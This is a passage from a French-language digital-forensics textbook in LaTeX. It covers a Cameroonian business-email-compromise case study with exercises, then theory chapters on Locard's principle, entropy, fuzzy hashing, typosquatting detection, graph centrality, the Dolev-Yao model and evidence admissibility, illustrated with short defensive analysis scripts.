    {BTC mixeur} (hassan);
\draw[blanchiment] (atangana) to[bend right=20]
    node[below, font=\tiny, color=CouleurAccent] {coordination} (hassan);
\end{tikzpicture}
\caption{Réseau criminel Opération WOURI --- flux d'information et financiers}
\end{figure}

\subsection{L'OSINT comme technique forensique à part entière}

L'identification d'OKAFOR (basé à Lagos, jamais entré au Cameroun) repose
exclusivement sur l'\termecle{OSINT}\index{OSINT} (\textit{Open Source
Intelligence})~:

\begin{enumerate}
    \item \textbf{LinkedIn~:} profil de « cybersecurity consultant »,
          3~anciens emplois vérifiables, email professionnel récupérable.
    \item \textbf{GitHub~:} un script de phishing publié avec des
          commentaires en anglais et en pidgin nigérian, signé du même
          pseudo.
    \item \textbf{Sherlock~:} l'outil de recherche de pseudo
          (\lstinline[language=bash_forensique]{sherlock duke_cyber_ng})
          identifie 12~plateformes supplémentaires.
    \item \textbf{Corrélation blockchain~:} les adresses Bitcoin
          transmises par ATANGANA sont reliées à des adresses connues du
          groupe SilverTerrier sur Blockchair.
\end{enumerate}

\begin{boxPNC}
\textbf{Procédure WOURI --- Actions coopération internationale}

L'affaire implique trois pays~; la coopération doit être lancée en parallèle
dès l'identification des suspects étrangers~:

\begin{enumerate}
    \item \textbf{OKAFOR (Nigeria)~:} transmission d'une Notice Bleue
          INTERPOL via le BCN Cameroun~; demande d'entraide judiciaire
          (ENTR) via l'ANIF si des flux financiers sont identifiés au Nigeria.

    \item \textbf{HASSAN (Émirats arabes unis)~:} demande de conservation
          urgente à Binance via le portail LEA (\textit{Law Enforcement
          Agency})~; demande d'identification du titulaire du compte Bitcoin.
          Les EAU ont signé la Convention de Budapest en 2021~: la
          procédure s'applique.

    \item \textbf{OKAFOR -- arrestation~:} une Notice Rouge INTERPOL est
          nécessaire pour permettre une arrestation provisoire au Nigeria.
          Elle requiert un mandat d'arrêt camerounais préalable.
\end{enumerate}
\end{boxPNC}

\begin{boxCRO}
\textbf{Analyse CRO --- Opération WOURI}

$\mathcal{C}$~: les communications WhatsApp d'ATANGANA (trouvées sur
son téléphone déverrouillé) sont une preuve directe mais contiennent
aussi des communications sans rapport avec l'affaire (famille, travail).
Le principe de proportionnalité impose de ne produire en justice que
les communications pertinentes.

$\mathcal{R}$~: les données blockchain (Blockchair) sont publiques et
reproductibles~; leur fiabilité est très haute. Les données Binance
(portail LEA) sont fiables mais leur chaîne d'obtention doit être
documentée pour $\mathcal{O}$.

$\mathcal{O}$~: le principal risque d'irrecevabilité est la coopération
internationale~: si les données obtenues du Nigeria ou des EAU ne
respectent pas les procédures \sigle{MLAT} (Mutual Legal Assistance
Treaty), un tribunal camerounais peut refuser de les utiliser.

\cro{$\downarrow$ gérer proportionnalité}{$\uparrow$}{$\sim$ dépend de la coopération}
\end{boxCRO}

% ============================================================================
\section{Tableau de Synthèse~: les Leçons Permanentes}
\label{sec:synthese-affaires}
% ============================================================================

Sept affaires, sept leçons, toutes applicables demain matin sur le terrain~:

\begin{tableaucours}{p{2.5cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Affaire} &
    \tableauHeader{Innovation forensique} &
    \tableauHeader{Leçon permanente}
}
BTK / Rader &
    Métadonnées comme preuve décisive &
    Extraire systématiquement les métadonnées~; une couche invisible peut
    identifier un suspect \\
Stuxnet &
    Cyberforensique industrielle &
    La sophistication est un marqueur d'attribution~;
    les ICS/SCADA sont une frontière émergente \\
WannaCry &
    Kill switch et kill chain &
    L'attribution est probabiliste~;
    la synchronisation des horloges est critique \\
Enron &
    E-discovery à grande échelle &
    La réquisition aux opérateurs est le levier légal du volume~;
    la déduplication par hachage est la méthode \\
ONAMBELE &
    Forensique Mobile Money + OSINT &
    Remonter la chaîne complète~;
    traiter le téléphone allumé selon le protocole avant tout \\
TANGUE &
    Convergence probatoire par artefacts multiples &
    Aucun artefact seul ne suffit~;
    la convergence de huit preuves est accablante \\
MVOM &
    Kill chain + Volatility + Loi 2024 &
    La victime peut être aussi contrevenante~;
    les deux procédures sont indépendantes \\
WOURI &
    BEC + OSINT + coopération multilatérale &
    Lancer la coopération internationale dès l'identification~;
    les plateformes \sigle{LEA} sont des outils légaux directement accessibles \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~3.3 --- Synthèse des leçons permanentes}\end{center}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}

\begin{itemize}
    \item Chaque grande affaire a produit une \textbf{innovation forensique}
          qui est aujourd'hui une technique standard~: les métadonnées (BTK),
          le sandboxing comportemental (Stuxnet), l'analyse kill chain
          (WannaCry, MVOM), la réquisition numérique (Enron, ONAMBELE).

    \item L'\textbf{artefact décisif} --- la seule preuve qui a fait basculer
          le dossier --- est rarement la plus spectaculaire. C'est souvent
          une métadonnée oubliée, un horodatage incohérent, ou un processus
          système anormal.

    \item Les \textbf{erreurs récurrentes} --- brancher le téléphone sans
          mode avion, arrêter le maillon faible sans remonter la chaîne,
          négliger la coopération internationale --- sont évitables. Elles
          se préviennent par le protocole, pas par le talent.

    \item Les \textbf{cas camerounais} (ONAMBELE, TANGUE, MVOM, WOURI)
          illustrent que les schémas mondiaux (fraude MoMo, ransomware BEC,
          réseaux transfrontaliers) opèrent au Cameroun avec les mêmes
          mécanismes et la même sophistication qu'ailleurs.

    \item Le Trilemme CRO se manifeste différemment dans chaque affaire~:
          Stuxnet sacrifie $\mathcal{O}$ au profit de $\mathcal{C}$ et
          $\mathcal{R}$~; TANGUE maximise $\mathcal{R}$ et $\mathcal{O}$~;
          WOURI dépend de la coopération internationale pour atteindre
          $\mathcal{O}$.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~3.1 --- Identification de l'artefact décisif \niveaubase}]
Pour chacune des situations suivantes, identifiez l'artefact décisif probable
et la méthode qui permettrait de l'extraire~:

\begin{enumerate}[(a)]
    \item Un suspect nie avoir participé à une réunion en ligne, mais vous
          disposez de son ordinateur Windows.
    \item Une entreprise prétend que ses données n'ont pas été exfiltrées
          avant le chiffrement par un ransomware. Vous disposez d'une
          capture réseau Wireshark de 48~heures.
    \item Une escroquerie sentimentale via Facebook~: le suspect prétend
          être à Paris, mais la victime affirme avoir été contactée depuis
          le Cameroun. Vous disposez du profil Facebook du suspect.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~3.2 --- Reconstitution d'attaque \niveaumoyen}]
\textbf{Scénario MVOM simplifié~:} vous recevez les données suivantes
concernant une PME camerounaise attaquée~:

\begin{itemize}
    \item Log pare-feu~: connexion RDP entrante depuis \texttt{91.192.X.X}
          le 03/04/2026 à 23h47, durée 3h12.
    \item Processus Volatility~: \texttt{powershell.exe} (PID~7231),
          parent~: \texttt{cmd.exe} (PID~7228), connexion vers
          \texttt{91.192.X.X:443} pendant 2h45.
    \item Log pare-feu~: transfert sortant de 4,7~Go vers \texttt{185.220.Y.Y}
          le 04/04/2026 entre 01h15 et 02h58.
    \item Autopsy~: 87\% des fichiers \texttt{.xlsx} et \texttt{.docx}
          portent l'extension \texttt{.locked2026}.

\end{itemize}

(a)~Placez chaque élément sur la Kill Chain (7~phases).\\
(b)~Quel est le vecteur d'entrée probable~? Quelle preuve l'établit~?\\
(c)~Quand a eu lieu l'exfiltration~: avant ou après le chiffrement~?
Quelle implication pour les victimes (données personnelles exfiltrées)~?\\
(d)~Quels articles de la \loicam{2010/012} et de la \loicam{2024/017}
qualifier pour les auteurs~? Pour la PME elle-même~?
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~3.3 --- Analyse CRO d'une décision
investigative \niveauexpert}]
Dans l'Opération WOURI, l'OPJ en charge décide d'extraire l'intégralité
du téléphone d'ATANGANA via ADB (après que celui-ci a fourni son code PIN)
pour analyser toutes ses communications des 12~derniers mois.

\begin{enumerate}[(a)]
    \item Évaluez cette décision selon le Trilemme CRO~: quelles
          dimensions sont renforcées ou fragilisées~?
    \item La décision est-elle proportionnelle~? Argumentez en référence
          au cadre légal camerounais et au type d'infraction.
    \item Proposez une alternative moins intrusive qui préserverait mieux
          $\mathcal{C}$ tout en maintenant une $\mathcal{O}$ satisfaisante.
    \item Comment documentez-vous dans votre rapport le choix effectué
          et sa justification, pour qu'un juge puisse l'évaluer~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Les Chapitres~4 et~5 complètent la Partie~I en
formalisant les \textbf{fondements théoriques} mobilisés dans ces affaires
(Shannon, Dolev-Yao, théorie de la complexité) et en dressant l'\textbf{état
de l'art} 2025 (IA forensique, deepfakes, conteneurs). La Partie~II
construit ensuite le \textbf{processus investigatif universel} qui structure
la mise en œuvre de toutes ces leçons dans une investigation réelle.
\end{boxinfo}

       
        % ============================================================================
% Fichier  : partie1/P01_C04_fondements_theoriques.tex
% Titre    : Fondements Theoriques
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : REDIGÉ
% Sources  : 3_fondements_theoriques.tex, 21_fondements_cryptanalyse.tex,
%             4_etat_art.tex, minka2025cro, minka2025zknr
% ============================================================================

\chapter{Fondements Théoriques}
\label{chap:fond-theo}

\epigraph{%
    « La théorie sans la pratique est vaine~; la pratique sans la théorie
    est aveugle. L'investigation numérique exige les deux. »%
}{--- Adaptation d'Emmanuel Kant, \textit{Critique de la raison pure}}

\niveauChapitre{Fondamental}{%
    Mathématiques de niveau licence (probabilités, algèbre de base,
    notions de complexité). Les résultats sont commentés pour être
    accessibles sans démonstration exhaustive.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Maîtriser le \termecle{principe de Locard numérique} et
          sa taxonomie des traces~: primaires, secondaires, tertiaires,
          résiduelles.
    \item Appliquer les trois outils de la théorie de l'information~:
          entropie, distance de Hamming, distance de Levenshtein.
    \item Modéliser un réseau criminel avec la théorie des graphes
          (centralité de degré, d'intermédiarité, PageRank, graphes temporels).
    \item Comprendre le modèle Dolev-Yao et en déduire les menaces
          sur la preuve numérique.
    \item Situer les modèles de processus (DFRWS, Casey, NIST, ISO~27037)
          dans leur cohérence et leurs différences.
    \item Articuler fondements théoriques et Trilemme CRO.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section{Le Principe de Locard Numérique}
\label{sec:locard}
% ============================================================================

\subsection{Origine et transposition au numérique}

Édmond Locard (1877--1966), directeur du premier laboratoire de police
scientifique au monde (Lyon, 1910), a formulé le principe fondateur de la
criminalistique~: \textit{« Tout contact laisse une trace. »} Sa transposition
au monde numérique est non triviale mais inévitable.

\begin{boxdef}
\textbf{Principe de Locard numérique}\index{Locard, principe numérique} ---
Tout processus informatique laisse des traces dans son environnement
d'exécution. Ces traces sont automatiques, involontaires, et persistent au
sein des systèmes de fichiers, des journaux, de la mémoire et du réseau,
indépendamment de la volonté de l'acteur qui a engendré le processus.
\end{boxdef}

La différence cruciale avec le monde physique est que le numérique laisse
des traces \textbf{à plusieurs niveaux simultanément}~: un simple clic sur
un lien Web génère des entrées dans l'historique du navigateur, une requête
DNS dans les journaux réseau, une connexion TCP dans les logs du routeur,
un artefact de cache dans le répertoire temporaire, et potentiellement
un enregistrement dans les bases de données du serveur distant.

\subsection{Taxonomie des traces numériques}

\begin{tableaucours}{p{3.2cm}p{4.2cm}p{4.8cm}}{%
    \tableauHeader{Catégorie} &
    \tableauHeader{Définition} &
    \tableauHeader{Exemples concrets}
}
\textbf{Traces primaires} &
    Générées directement par l'action incriminée &
    Fichier créé, email envoyé, transaction MoMo exécutée, connexion RDP \\
\textbf{Traces secondaires} &
    Générées par l'environnement en réponse à l'action &
    Logs système, historique navigateur, registre Windows, Prefetch,
    métadonnées EXIF \\
\textbf{Traces tertiaires} &
    Générées par les outils de sécurité &
    Alertes IDS/SIEM, logs pare-feu, journaux VPN, audit Active Directory \\
\textbf{Traces résiduelles} &
    Persistant après tentative d'effacement &
    Fichiers dans l'espace non alloué, entrées MFT orphelines,
    \textit{slack space}, \texttt{\$LogFile} NTFS \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~4.1 --- Taxonomie des traces numériques
selon le principe de Locard}\end{center}

\subsection{Locard dans les affaires étudiées}

Le principe de Locard explique a posteriori pourquoi chaque grande affaire
a pu être résolue~:
\begin{itemize}
    \item \textbf{BTK/Rader}~: les métadonnées Office sont des \emph{traces
          secondaires} --- générées automatiquement par Word, indépendamment
          de toute intention de Rader.
    \item \textbf{MVOM}~: la connexion RDP est une \emph{trace primaire} dans
          les logs pare-feu~; le processus \texttt{svchost.exe} malveillant en
          RAM est une \emph{trace secondaire} de son installation.
    \item \textbf{WOURI}~: les transactions Bitcoin sont des \emph{traces
          primaires} permanentes et immuables --- Locard dans sa forme absolue.
\end{itemize}

\begin{boiteRemarque}{L'anti-forensique comme tentative de violation de Locard}
Les techniques d'\termecle{anti-forensique}\index{anti-forensique} (suppression
de fichiers, nettoyage des logs, chiffrement) ne violent pas Locard~: elles
tentent de le contourner. Mais l'effacement lui-même laisse des traces~:
les outils utilisés apparaissent dans le Prefetch Windows~; les entrées MFT
supprimées persistent dans l'espace non alloué~; l'horodatage de la suppression
est enregistré dans \texttt{\$LogFile}. La trace de la suppression est une
trace secondaire au sens de Locard.
\end{boiteRemarque}

% ============================================================================
\section{Théorie de l'Information~: l'Arsenal de Shannon}
\label{sec:shannon-arsenal}
% ============================================================================

\subsection{L'entropie comme détecteur d'anomalie}

La théorie de Shannon \cite{shannon1948} fournit trois outils directement
opérationnels. L'entropie $H(X)$ a été introduite au Chapitre~\ref{chap:phi-fond}.
Rappelons son calcul sur un fichier binaire~: on estime la distribution des
256 valeurs d'octet possibles~:

\begin{equation}
H_{\text{fichier}} = -\sum_{b=0}^{255}
\frac{n_b}{N}\,\log_2\!\left(\frac{n_b}{N}\right)
\label{eq:shannon-fichier}
\end{equation}

où $n_b$ est le nombre d'occurrences de l'octet de valeur $b$ et $N$ le nombre
total d'octets analysés.

\begin{lstlisting}[language=bash_forensique,
    caption={Calcul de l'entropie d'un fichier --- script Python forensique}]
import math, collections

def entropie(chemin, echantillon=65536):
    with open(chemin, 'rb') as f:
        d = f.read(echantillon)
    n = len(d)
    cpt = collections.Counter(d)
    h = -sum((c/n)*math.log2(c/n) for c in cpt.values())
    return h

# Interprétation
h = entropie('suspect.bin')
if   h > 7.5: print('CHIFFRE ou COMPRESSE -- investigation approfondie')
elif h > 6.0: print('Binaire compile -- normal pour un executable')
elif h > 3.5: print('Texte ou donnees structurees -- normal')
else        : print('Tres repetitif -- fichier sparse ou quasi vide')
\end{lstlisting}

\subsection{La distance de Hamming~: identifier les variantes de malware}

La \termecle{distance de Hamming}\index{distance de Hamming} mesure le nombre
de positions où deux chaînes binaires de même longueur diffèrent~:

\begin{equation}
d_H(x, y) = \sum_{i=1}^{n} \mathbf{1}[x_i \neq y_i]
\label{eq:hamming}
\end{equation}

En pratique, les \termecle{fuzzy hashes}\index{fuzzy hash} (ssdeep, TLSH)
calculent des distances approximatives sur des fichiers de taille variable~:
une distance normalisée $d_H(x,y)/n < 0.15$ entre deux binaires indique
une probable appartenance à la même famille de malware.

\begin{lstlisting}[language=bash_forensique,
    caption={Fuzzy hashing avec ssdeep}]
# Calculer le fuzzy hash d'un fichier
ssdeep -b malware_suspect.exe

# Comparer avec une référence (score 0-100, 100 = identiques)
ssdeep -m malware_reference.exe malware_suspect.exe
# Sortie : matches malware_reference.exe (88)
# Score 88 : variante très probable de la même famille

# Comparaison sur un répertoire entier
ssdeep -r -m malware_reference.exe /dossier/suspects/
\end{lstlisting}

\subsection{La distance de Levenshtein~: typosquatting et comparaison de textes}

La \termecle{distance de Levenshtein}\index{distance de Levenshtein} mesure
le nombre minimum d'insertions, suppressions et substitutions pour transformer
une chaîne en une autre~:

\begin{equation}
d_L(s, t) = \min_{\text{séq. d'opérations}} |\text{opérations}(s \to t)|
\label{eq:levenshtein}
\end{equation}

Applications forensiques directes~:
\begin{itemize}
    \item \textbf{Typosquatting} (WOURI)~: le domaine frauduleux
          \texttt{medequip-portugal.com} a une distance de Levenshtein très faible
          par rapport au domaine légitime \texttt{medequip.pt}~; l'outil
          \textit{dnstwist} automatise cette détection.
    \item \textbf{Variantes de scripts}~: deux scripts avec $d_L$ faible ont
          probablement le même auteur.
    \item \textbf{Pseudonymes}~: deux noms très proches dans des bases de données
          différentes peuvent désigner la même personne.
\end{itemize}

\begin{lstlisting}[language=bash_forensique,
    caption={Détection de typosquatting avec dnstwist}]
# Génère toutes les variantes du domaine et vérifie celles enregistrées
dnstwist --registered medequip.pt

# Sortie typique :
# Original*       medequip.pt           185.xx.xx.xx
# Hyphenation     medequip-pt.com       91.xxx.xx.xx  <- SUSPECT
# Transposition   meidquip.pt           [NON ENREGISTRE]
\end{lstlisting}

% ============================================================================
\section{Théorie des Graphes en Investigation Numérique}
\label{sec:graphes}
% ============================================================================

\subsection{Formalisation des réseaux criminels}

Un réseau criminel ou de communication est modélisé par un
\termecle{graphe orienté pondéré}\index{graphe!orienté pondéré}~:

\begin{equation}
G = (V, E, w), \quad
E \subseteq V \times V, \quad
w : E \to \mathbb{R}^+
\label{eq:graphe-pondere}
\end{equation}

où $V$ est l'ensemble des entités (personnes, machines, comptes, adresses IP),
$E$ l'ensemble des relations (communications, transferts, accès) et $w(u,v)$
le poids de la relation (montant transféré, fréquence d'accès).

\subsection{Métriques de centralité~: identifier les acteurs clés}

\subsubsection{Centralité de degré}

\begin{equation}
C_D(v) = \frac{\deg(v)}{|V| - 1}
\label{eq:centralite-degre}
\end{equation}

Un nœud à forte centralité de degré est un \textbf{hub de communication}.
Dans WOURI, ATANGANA avait la centralité de degré la plus élevée.

\subsubsection{Centralité d'intermédiarité (\textit{betweenness centrality})}

\begin{equation}
C_B(v) = \sum_{s \neq v \neq t}
\frac{\sigma(s, t \mid v)}{\sigma(s, t)}
\label{eq:centralite-betweenness}
\end{equation}

où $\sigma(s,t)$ est le nombre de chemins les plus courts entre $s$ et $t$,
et $\sigma(s,t \mid v)$ ceux qui passent par $v$. Un acteur à forte centralité
d'intermédiarité est un \textbf{pont critique}~: le neutraliser fragmente
le réseau. Dans WOURI, NGUEMO était le pont entre la collecte des fonds
(Cameroun) et le blanchiment (EAU).

\subsubsection{PageRank forensique}

\begin{equation}
\mathrm{PR}(v) = \frac{1-d}{|V|} + d \sum_{u \in \mathcal{N}^{-}(v)}
\frac{\mathrm{PR}(u)}{\mathrm{deg}^+(u)}, \quad d \approx 0.85
\label{eq:pagerank}
\end{equation}

En investigation d'emails, PageRank identifie les personnes les plus influentes
dans un réseau de communication~: celles dont les messages sont fréquemment
répondus ou transférés (comme dans l'affaire Enron).

\subsection{Graphes temporels~: la chronologie comme dimension analytique}

Un \termecle{graphe temporel}\index{graphe!temporel} $G = (V, E, T)$ ajoute
une dimension temporelle aux arêtes~:

\begin{equation}
E \subseteq V \times V \times T
\label{eq:graphe-temporel}
\end{equation}

En forensique réseau, chaque connexion est un triplet
$(\text{source}, \text{destination}, t)$. L'analyse du graphe temporel
permet de \textbf{reconstituer un chemin d'attaque}~: deux événements $e_1$
et $e_2$ sont causalement liés si $t(e_2) - t(e_1)$ est faible et si les
entités impliquées se recoupent.

\begin{lstlisting}[language=bash_forensique,
    caption={Analyse de graphe criminel avec NetworkX}]
import networkx as nx

G = nx.DiGraph()
# Arêtes : (source, destination, poids)
edges = [
    ('ATANGANA', 'OKAFOR',  {'w': 1, 'd': '2026-01'}),
    ('OKAFOR',   'SOTRADI', {'w': 47, 'd': '2026-01-15'}),
    ('SOTRADI',  'NGUEMO',  {'w': 47, 'd': '2026-01-15'}),
    ('NGUEMO',   'HASSAN',  {'w': 45, 'd': '2026-01-15'}),
]
G.add_edges_from([(u,v,d) for u,v,d in edges])

# Centralité d'intermédiarité
btw = nx.betweenness_centrality(G)
# -> NGUEMO et OKAFOR ont les valeurs les plus élevées

# PageRank (acteur le plus 'central' dans le flux)
pr = nx.pagerank(G, weight='w')
\end{lstlisting}

% ============================================================================
\section{Le Modèle Dolev-Yao~: l'Adversaire Formel}
\label{sec:dolev-yao}
% ============================================================================

\subsection{Définition}

Le \termecle{modèle Dolev-Yao}\index{Dolev-Yao, modèle} \cite{dolevyao1983}
est le cadre formel standard pour raisonner sur la sécurité d'un protocole
cryptographique face à un adversaire actif~:

\begin{boxdef}
\textbf{Adversaire Dolev-Yao} --- Un adversaire $\mathcal{A}$ qui~:
\begin{enumerate}
    \item peut \textbf{intercepter} tout message transitant sur le réseau~;
    \item peut \textbf{modifier, rejouer, supprimer ou réordonner} tout message~;
    \item peut \textbf{injecter} des messages en se faisant passer pour
          n'importe quelle entité~;
    \item \textbf{ne peut pas} casser les primitives cryptographiques
          correctement utilisées (déchiffrer sans clé, forger une signature).
\end{enumerate}
\end{boxdef}

\subsection{Implications forensiques}

\textbf{Implication~1~:} toute preuve transmise sur un réseau non sécurisé
est potentiellement compromise. La chaîne de custody numérique doit inclure
la sécurisation des canaux de transmission (chiffrement + signature).

\textbf{Implication~2~:} la non-répudiation est un problème difficile.
Comment prouver qu'un message a bien été envoyé par Alice et non par
$\mathcal{A}$ se faisant passer pour elle~? La réponse est la signature
numérique asymétrique~: seul le détenteur de la clé privée d'Alice peut
produire sa signature. C'est le fondement mathématique du protocole ZK-NR
\cite{minka2025zknr} formalisé dans la Partie~VI.

\subsection{Du modèle Dolev-Yao au Trilemme CRO}

Dolev-Yao modélise ce que l'adversaire peut faire techniquement.
Le Trilemme CRO généralise en ajoutant la dimension légale~:

\begin{equation}
\underbrace{\mathcal{C}}_{\text{protéger contre }\mathcal{A}} +
\underbrace{\mathcal{R}}_{\text{résister à }\mathcal{A}} +
\underbrace{\mathcal{O}}_{\text{prouver face au juge}}
\;\leq\; 1 + \epsilon
\label{eq:CRO-dolev}
\end{equation}

La relation~\eqref{eq:CRO-dolev} formalise l'impossibilité~: maximiser la
protection contre $\mathcal{A}$ ($\mathcal{C}$ et $\mathcal{R}$ élevés) rend
la preuve difficile à vérifier par des tiers ($\mathcal{O}$ contraint).
Les protocoles ZK résolvent partiellement cette tension.

% ============================================================================
\section{Complexité Computationnelle et Sécurité Forensique}
\label{sec:complexite}
% ============================================================================

\subsection{Problèmes difficiles et sécurité cryptographique}

Toute la cryptographie moderne repose sur des problèmes
\textbf{calculatoirement difficiles}. La notation $\mathcal{O}$-grand
formalise la complexité~:

\begin{equation}
f(n) = \mathcal{O}(g(n)) \iff
\exists\, c > 0,\; n_0 \geq 0 \;\text{ tels que }\;
\forall n \geq n_0,\; f(n) \leq c\,g(n)
\label{eq:big-O}
\end{equation}

Les deux problèmes difficiles fondamentaux~:
\begin{enumerate}
    \item \textbf{Factorisation d'entiers}~: étant donné $N = p \cdot q$,
          retrouver $p$ et $q$. Complexité classique~:
          $\mathcal{O}(e^{n^{1/3}})$. Fondement de RSA.
    \item \textbf{Logarithme discret}~: étant donné $g^x \bmod p$,
          retrouver $x$. Fondement de Diffie-Hellman et des courbes
          elliptiques.
\end{enumerate}

\subsection{La menace quantique~: algorithme de Shor}

L'algorithme de \termecle{Shor}\index{Shor, algorithme de} (1994) résout
ces deux problèmes en temps polynomial sur un ordinateur quantique~:

\begin{equation}
T_{\text{Shor}}(n) = \mathcal{O}(n^3)
\quad \text{vs} \quad
T_{\text{classique}}(n) = \mathcal{O}(e^{n^{1/3}})
\label{eq:shor}
\end{equation}

L'implication pour la forensique est directe~: les preuves collectées en 2026
et chiffrées avec RSA ou ECDSA seront potentiellement déchiffrables dans
10 à 15 ans. C'est la stratégie
\termecle{Harvest Now, Decrypt Later}\index{Harvest Now Decrypt Later}~:
un adversaire étatique collecte aujourd'hui des données chiffrées pour les
déchiffrer demain.

\begin{boxalert}
\textbf{Migration post-quantique --- obligation éthique pour les données
longue durée.}

Le NIST a finalisé en 2024 quatre algorithmes post-quantiques~:
CRYSTALS-Kyber (chiffrement), CRYSTALS-Dilithium, FALCON et SPHINCS+
(signatures). Pour les investigations impliquant des données à longue
durée de vie (terrorisme, protection de témoins, secrets industriels),
le passage à ces algorithmes est une obligation éthique.
\end{boxalert}

\subsection{Fonctions à sens unique et hachage forensique}

Le hachage cryptographique repose sur une
\termecle{fonction à sens unique}\index{fonction à sens unique}~:

\begin{equation}
h : \{0,1\}^* \to \{0,1\}^n
\label{eq:hash-def}
\end{equation}

facile à calculer ($\mathcal{O}(|m|)$), impossible à inverser sans clé.
Trois propriétés de sécurité~:
\begin{enumerate}
    \item \textbf{Résistance à la préimage}~: étant donné $y$, infaisable
          de trouver $x$ tel que $h(x) = y$.
    \item \textbf{Résistance à la seconde préimage}~: étant donné $x$,
          infaisable de trouver $x' \neq x$ tel que $h(x') = h(x)$.
    \item \textbf{Résistance aux collisions}~: infaisable de trouver
          $(x, x')$ tels que $h(x) = h(x')$.
\end{enumerate}

Ces propriétés fondent le \textbf{principe de preuve d'intégrité}~: si le
hash de l'image forensique correspond au hash du disque original, aucune
modification n'a eu lieu. L'investigateur ne \emph{déclare} pas l'intégrité~;
le hash la \emph{prouve} mathématiquement.

% ============================================================================
\section{Modèles de Processus Forensique}
\label{sec:modeles-processus}
% ============================================================================

\subsection{Panorama et positionnement}

\begin{tableaucours}{p{2.4cm}p{2.0cm}p{5.5cm}p{1.8cm}}{%
    \tableauHeader{Modèle} &
    \tableauHeader{Origine} &
    \tableauHeader{Contribution} &
    \tableauHeader{Niveau}
}
DFRWS 2001 & Recherche & Premier modèle systématique~: 6~phases séquentielles & Conceptuel \\
Casey 2004 & Académique & Modèle intégré~: 5~phases, contexte judiciaire fort & Académique \\
\norme{NIST SP 800-86} & Gouvernement &
    Intégration IR + forensique~; distinction Exam./Analysis & Opérationnel \\
\norme{ISO/IEC 27037} & Normalisation &
    Standard international~: rôles DEFR et DES définis & Normatif \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~4.2 --- Panorama des modèles de processus}
\end{center}

\subsection{Le modèle DFRWS (2001)}

Le \termecle{DFRWS}\index{DFRWS} \cite{dfrws2001} a publié le premier modèle
formel de processus en six phases~:
\begin{enumerate}
    \item \textbf{Identification} --- reconnaître l'incident et définir son périmètre.
    \item \textbf{Préservation} --- isoler et protéger les preuves.
    \item \textbf{Collection} --- acquérir selon des méthodes documentées.
    \item \textbf{Examination} --- extraire les informations des preuves collectées.
    \item \textbf{Analysis} --- corréler pour reconstituer les événements.
    \item \textbf{Presentation} --- communiquer de façon défendable.
\end{enumerate}

La limite du DFRWS est son caractère \textbf{linéaire}~: un investigateur
alterne en réalité entre Collection et Examination au fil des découvertes.

\subsection{La distinction Examination / Analysis (NIST SP~800-86)}

La contribution centrale de \norme{NIST SP~800-86} \cite{nist80086} est la
distinction~:
\begin{itemize}
    \item \textbf{Examination}~: appliquer des méthodes systématiques pour
          identifier et extraire. L'examinateur documente ce qu'il \emph{trouve},
          pas ce que cela \emph{signifie}.
    \item \textbf{Analysis}~: interpréter les données extraites, tester des
          hypothèses, corréler les sources. L'analyste tire des conclusions.
\end{itemize}

Cette distinction est fondamentale~: un avocat peut attaquer une interprétation~;
il ne peut pas attaquer un hash qui correspond.

\subsection{ISO/IEC 27037~: standard international et rôles}

\norme{ISO/IEC~27037:2012} définit deux rôles distincts~:
\begin{itemize}
    \item \textbf{DEFR} (\textit{Digital Evidence First Responder}) ---
          premier intervenant sur la scène~; responsable de la préservation
          initiale. Son erreur est irréparable.
    \item \textbf{DES} (\textit{Digital Evidence Specialist}) --- analyste
          en laboratoire~; responsable de l'examination et de l'analysis.
\end{itemize}

\begin{boxjuris}
\textbf{Compatibilité ISO/IEC~27037 et droit camerounais~:}\\[0.3ex]
La \loicam{2010/012}, articles~52--59, impose~: présence des parties,
copie réalisée en leur présence, documentation. Ces exigences sont
\emph{substantiellement alignées} sur ISO/IEC~27037. Un investigateur
respectant le standard international respecte de facto les articles~52--59.
\end{boxjuris}

% ============================================================================
\section{Théorie de la Preuve Numérique}
\label{sec:theorie-preuve}
% ============================================================================

\subsection{Conditions formelles d'admissibilité}

La validité d'une preuve numérique $P$ peut être formalisée~:

\begin{equation}
\mathrm{Admissible}(P) \iff
\underbrace{\mathrm{Légale}(P)}_{\text{obtention licite}}
\;\wedge\;
\underbrace{\mathrm{Intègre}(P)}_{\text{hash vérifié}}
\;\wedge\;
\underbrace{\mathrm{Authentique}(P)}_{\text{custody continue}}
\;\wedge\;
\underbrace{\mathrm{Pertinente}(P)}_{\text{lien avec les faits}}
\label{eq:admissibilite}
\end{equation}

La conjonction ($\wedge$) est stricte~: l'absence d'une seule condition
invalide la preuve entière.

\subsection{La distinction constatation / interprétation}

\begin{tableaucours}{p{5.5cm}p{5.5cm}}{%
    \tableauHeader{Constatation (factuelle)} &
    \tableauHeader{Interprétation (analytique)}
}
« Le fichier \texttt{faux\_bon.docx} a été créé le 03/02/2026 à 14h22. » &
« BELLO a créé ce fichier pour préparer un détournement. » \\
« \texttt{svchost.exe} (PID~4892) a \texttt{cmd.exe} comme parent. » &
« Ce processus est anormal et indique une compromission. » \\
« Le hash MD5 de l'image correspond au hash de l'original. » &
« L'image est fidèle au disque et n'a pas été altérée. » \\
« L'adresse IP source est 185.220.XX.XX. » &
« L'attaque provenait de Roumanie. » \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~4.3 --- Distinction constatation/interprétation~:
exemples tirés des affaires TANGUE et MVOM}\end{center}

\subsection{La méthode des hypothèses concurrentes (ACH)}

Un investigateur rigoureux ne cherche pas à \emph{confirmer} sa thèse~:
il cherche à la \emph{falsifier}. Pour chaque conclusion~:

\begin{equation}
H_0 \;\text{(hypothèse principale)} \quad \text{vs} \quad
H_1, H_2, \ldots, H_k \;\text{(hypothèses concurrentes)}
